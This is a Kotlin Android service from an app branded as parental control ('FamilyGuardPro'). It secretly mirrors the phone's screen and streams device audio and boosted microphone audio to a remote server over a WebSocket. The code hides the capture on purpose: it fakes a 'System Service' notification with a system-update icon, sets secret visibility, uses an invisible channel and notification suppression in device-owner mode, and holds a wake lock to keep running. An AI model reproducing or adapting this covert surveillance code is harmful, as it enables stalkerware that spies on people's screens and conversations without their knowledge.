package com.familyguardpro.services

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioPlaybackCaptureConfiguration
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI

/**
 * Screen Mirror Service - Captures screen as JPEG frames + Audio (device + mic)
 * Uses JPEG encoding for web browser compatibility
 */
class ScreenMirrorService : Service() {

    companion object {
        private const val TAG = "ScreenMirrorService"
        private const val NOTIFICATION_ID = 1005
        
        // Screen capture settings - lower resolution for bandwidth
        private const val SCREEN_WIDTH = 540
        private const val SCREEN_HEIGHT = 960
        private const val JPEG_QUALITY = 50
        private const val TARGET_FPS = 8
        private const val FRAME_INTERVAL_MS = 1000L / TARGET_FPS
        private const val WAKELOCK_TAG = "FamilyGuard:ScreenMirror"
        
        // Audio capture settings
        private const val AUDIO_SAMPLE_RATE = 16000
        private const val AUDIO_CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        
        // AGC settings for microphone
        private const val TARGET_LEVEL = 18000.0
        private const val AGC_ATTACK = 0.01
        private const val AGC_RELEASE = 0.001
        private const val MIN_GAIN = 1.0
        private const val MAX_GAIN = 30.0
        
        private var resultCode: Int = 0
        private var resultData: Intent? = null
        
        fun setMediaProjectionResult(code: Int, data: Intent?) {
            resultCode = code
            resultData = data
            Log.d(TAG, "MediaProjection result set: code=$code, data=${data != null}")
        }
        
        fun hasPermission(): Boolean = resultCode != 0 && resultData != null
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var webSocketClient: WebSocketClient? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    private var isStreaming = false
    private var lastFrameTime = 0L
    private var wakeLock: PowerManager.WakeLock? = null
    
    // Audio capture
    private var deviceAudioRecord: AudioRecord? = null
    private var micAudioRecord: AudioRecord? = null
    private var isAudioStreaming = false
    private var currentGain = 10.0
    private var previousGain = 10.0

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        acquireWakeLock()
        startBackgroundThread()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL: Always call startForeground() FIRST to meet Android O+ requirement
        // Must be called within 5 seconds of startForegroundService()
        startForeground()
        
        when (intent?.action) {
            "START" -> {
                if (resultCode != 0 && resultData != null) {
                    startStreaming()
                } else {
                    Log.e(TAG, "MediaProjection permission not granted")
                    val captureIntent = com.familyguardpro.ScreenCaptureActivity.createIntent(this, true)
                    captureIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(captureIntent)
                }
            }
            "STOP" -> {
                stopStreaming()
                stopSelf()
            }
            else -> {
                // Legacy support - START if no action specified but we have permission
                if (resultCode != 0 && resultData != null) {
                    startStreaming()
                } else {
                    Log.e(TAG, "MediaProjection permission not granted")
                    stopSelf()
                }
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
        stopBackgroundThread()
        releaseWakeLock()
        serviceScope.cancel()
    }

    private fun startForeground() {
        // Check if Device Owner mode - use invisible channel
        val doManager = try {
            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
        } catch (e: Exception) { null }
        
        val channelId = if (doManager?.isDeviceOwner() == true) {
            // Use invisible channel for DO mode
            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
        } else {
            FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Include both MEDIA_PROJECTION and MICROPHONE for video + audio capture
            startForeground(NOTIFICATION_ID, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("ScreenMirrorBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    private fun startStreaming() {
        if (isStreaming) return
        isStreaming = true
        Log.d(TAG, "Starting screen mirror streaming")
        connectWebSocket { initMediaProjection() }
    }

    private fun stopStreaming() {
        if (!isStreaming) return
        isStreaming = false
        Log.d(TAG, "Stopping screen mirror streaming")
        
        // Stop audio capture first
        stopAudioCapture()
        
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        mediaProjection?.stop()
        mediaProjection = null
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_screen"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=screen"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected for screen mirror")
                send(JSONObject().apply {
                    put("type", "stream_started")
                    put("streamType", "screen")
                }.toString())
                onConnected()
            }

            override fun onMessage(message: String?) {
                if (message == "stop" || message?.contains("stop") == true) {
                    stopStreaming()
                    stopSelf()
                }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
                if (isStreaming && remote) {
                    serviceScope.launch {
                        delay(3000)
                        if (isStreaming) connectWebSocket(onConnected)
                    }
                }
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        try {
            webSocketClient?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to connect WebSocket", e)
        }
    }

    private fun initMediaProjection() {
        try {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData!!)
            
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to get MediaProjection")
                return
            }
            
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.d(TAG, "MediaProjection stopped by system")
                    stopStreaming()
                    stopSelf()
                }
            }, backgroundHandler)
            
            createVirtualDisplay()
            
            // Start audio capture (device audio + microphone)
            startAudioCapture()
            
            Log.d(TAG, "MediaProjection initialized with VIDEO + AUDIO")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize MediaProjection", e)
        }
    }
    
    /**
     * Start capturing both device audio and microphone audio
     * Mixes them together for the stream
     */
    @SuppressLint("MissingPermission")
    private fun startAudioCapture() {
        isAudioStreaming = true
        
        val minBuffer = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE, AUDIO_CHANNEL_CONFIG, AUDIO_FORMAT)
        val bufferSize = minBuffer * 4
        
        // Start device audio capture (API 29+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val config = AudioPlaybackCaptureConfiguration.Builder(mediaProjection!!)
                    .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
                    .addMatchingUsage(AudioAttributes.USAGE_GAME)
                    .addMatchingUsage(AudioAttributes.USAGE_UNKNOWN)
                    .build()
                
                val audioFormat = AudioFormat.Builder()
                    .setEncoding(AUDIO_FORMAT)
                    .setSampleRate(AUDIO_SAMPLE_RATE)
                    .setChannelMask(AudioFormat.CHANNEL_IN_MONO)
                    .build()
                
                deviceAudioRecord = AudioRecord.Builder()
                    .setAudioPlaybackCaptureConfig(config)
                    .setAudioFormat(audioFormat)
                    .setBufferSizeInBytes(bufferSize)
                    .build()
                
                if (deviceAudioRecord?.state == AudioRecord.STATE_INITIALIZED) {
                    deviceAudioRecord?.startRecording()
                    Log.d(TAG, "Device audio capture started")
                } else {
                    Log.e(TAG, "Device AudioRecord init failed")
                    deviceAudioRecord = null
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start device audio capture", e)
                deviceAudioRecord = null
            }
        }
        
        // Start microphone capture
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
            == PackageManager.PERMISSION_GRANTED) {
            try {
                val audioSources = listOf(
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.CAMCORDER,
                    MediaRecorder.AudioSource.MIC
                )
                
                for (source in audioSources) {
                    try {
                        micAudioRecord = AudioRecord(
                            source,
                            AUDIO_SAMPLE_RATE,
                            AUDIO_CHANNEL_CONFIG,
                            AUDIO_FORMAT,
                            bufferSize
                        )
                        
                        if (micAudioRecord?.state == AudioRecord.STATE_INITIALIZED) {
                            micAudioRecord?.startRecording()
                            Log.d(TAG, "Mic audio capture started with source: $source")
                            break
                        } else {
                            micAudioRecord?.release()
                            micAudioRecord = null
                        }
                    } catch (e: Exception) {
                        micAudioRecord = null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start mic audio capture", e)
            }
        }
        
        // Start audio streaming coroutine - mixes both sources
        serviceScope.launch(Dispatchers.IO) {
            val chunkSize = minBuffer / 2
            val deviceBuffer = ShortArray(chunkSize)
            val micBuffer = ShortArray(chunkSize)
            val mixedBuffer = ShortArray(chunkSize)
            
            while (isAudioStreaming && isStreaming) {
                try {
                    var hasDeviceAudio = false
                    var hasMicAudio = false
                    
                    // Read device audio
                    val deviceRead = deviceAudioRecord?.read(deviceBuffer, 0, chunkSize) ?: 0
                    if (deviceRead > 0) hasDeviceAudio = true
                    
                    // Read mic audio
                    val micRead = micAudioRecord?.read(micBuffer, 0, chunkSize) ?: 0
                    if (micRead > 0) hasMicAudio = true
                    
                    // Mix audio based on what's available
                    val actualSize = maxOf(deviceRead, micRead)
                    if (actualSize > 0) {
                        for (i in 0 until actualSize) {
                            val deviceSample = if (hasDeviceAudio && i < deviceRead) deviceBuffer[i].toInt() else 0
                            // Apply AGC to mic for far distance capture
                            var micSample = if (hasMicAudio && i < micRead) {
                                (micBuffer[i] * currentGain).toInt()
                            } else 0
                            
                            // Mix: device audio at 70%, mic at 50% (allows both to be heard)
                            var mixed = (deviceSample * 0.7 + micSample * 0.5).toInt()
                            
                            // Soft limiting
                            if (mixed > 28000) mixed = 28000 + ((mixed - 28000) / 4)
                            if (mixed < -28000) mixed = -28000 + ((mixed + 28000) / 4)
                            
                            mixed = mixed.coerceIn(Short.MIN_VALUE.toInt(), Short.MAX_VALUE.toInt())
                            mixedBuffer[i] = mixed.toShort()
                        }
                        
                        // Update AGC gain for mic
                        updateMicGain(micBuffer, micRead)
                        
                        // Send mixed audio
                        sendAudioChunk(shortArrayToByteArray(mixedBuffer, actualSize))
                    } else {
                        delay(10)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in audio capture loop", e)
                    delay(50)
                }
            }
        }
        
        Log.d(TAG, "Audio capture started - DEVICE + MIC mixed")
    }
    
    private fun updateMicGain(buffer: ShortArray, length: Int) {
        if (length <= 0) return
        
        var peak = 0
        for (i in 0 until length) {
            val absVal = kotlin.math.abs(buffer[i].toInt())
            if (absVal > peak) peak = absVal
        }
        
        if (peak > 100) {
            val targetGain = (TARGET_LEVEL / peak).coerceIn(MIN_GAIN, MAX_GAIN)
            previousGain = currentGain
            if (targetGain < currentGain) {
                currentGain = currentGain * (1 - AGC_ATTACK) + targetGain * AGC_ATTACK
            } else {
                currentGain = currentGain * (1 - AGC_RELEASE) + targetGain * AGC_RELEASE
            }
            currentGain = currentGain.coerceIn(MIN_GAIN, MAX_GAIN)
        }
    }
    
    private fun shortArrayToByteArray(shorts: ShortArray, length: Int): ByteArray {
        val bytes = ByteArray(length * 2)
        for (i in 0 until length) {
            bytes[i * 2] = (shorts[i].toInt() and 0xFF).toByte()
            bytes[i * 2 + 1] = (shorts[i].toInt() shr 8 and 0xFF).toByte()
        }
        return bytes
    }
    
    private fun sendAudioChunk(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("screen_audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk", e)
        }
    }
    
    private fun stopAudioCapture() {
        isAudioStreaming = false
        
        try {
            deviceAudioRecord?.stop()
            deviceAudioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing device audio", e)
        }
        deviceAudioRecord = null
        
        try {
            micAudioRecord?.stop()
            micAudioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing mic audio", e)
        }
        micAudioRecord = null
        
        Log.d(TAG, "Audio capture stopped")
    }

    private fun createVirtualDisplay() {
        imageReader = ImageReader.newInstance(SCREEN_WIDTH, SCREEN_HEIGHT, PixelFormat.RGBA_8888, 2)
        
        imageReader?.setOnImageAvailableListener({ reader ->
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastFrameTime < FRAME_INTERVAL_MS) {
                reader.acquireLatestImage()?.close()
                return@setOnImageAvailableListener
            }
            lastFrameTime = currentTime
            
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                processAndSendFrame(image)
            } catch (e: Exception) {
                Log.e(TAG, "Error processing frame", e)
            } finally {
                image.close()
            }
        }, backgroundHandler)
        
        // Use combined flags for better compatibility across apps
        val displayFlags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR or
                          DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC
        
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenMirror",
            SCREEN_WIDTH, SCREEN_HEIGHT,
            resources.displayMetrics.densityDpi,
            displayFlags,
            imageReader?.surface,
            null,
            backgroundHandler
        )
        Log.d(TAG, "Virtual display created: ${SCREEN_WIDTH}x${SCREEN_HEIGHT}")
    }

    private fun processAndSendFrame(image: android.media.Image) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * SCREEN_WIDTH
            
            val bitmap = Bitmap.createBitmap(
                SCREEN_WIDTH + rowPadding / pixelStride,
                SCREEN_HEIGHT,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            
            val croppedBitmap = if (rowPadding > 0) {
                Bitmap.createBitmap(bitmap, 0, 0, SCREEN_WIDTH, SCREEN_HEIGHT)
            } else {
                bitmap
            }
            
            val outputStream = ByteArrayOutputStream()
            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, outputStream)
            val jpegData = outputStream.toByteArray()
            
            val base64Frame = Base64.encodeToString(jpegData, Base64.NO_WRAP)
            val frameJson = JSONObject().apply {
                put("type", "screen_frame")
                put("frame", base64Frame)
                put("width", SCREEN_WIDTH)
                put("height", SCREEN_HEIGHT)
            }
            
            webSocketClient?.send(frameJson.toString())
            
            if (croppedBitmap != bitmap) croppedBitmap.recycle()
            bitmap.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error sending frame", e)
        }
    }
    
    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKELOCK_TAG
            ).apply {
                acquire()
            }
            Log.d(TAG, "Wake lock acquired for screen mirror")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }
    
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "Wake lock released")
                }
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock", e)
        }
    }
}
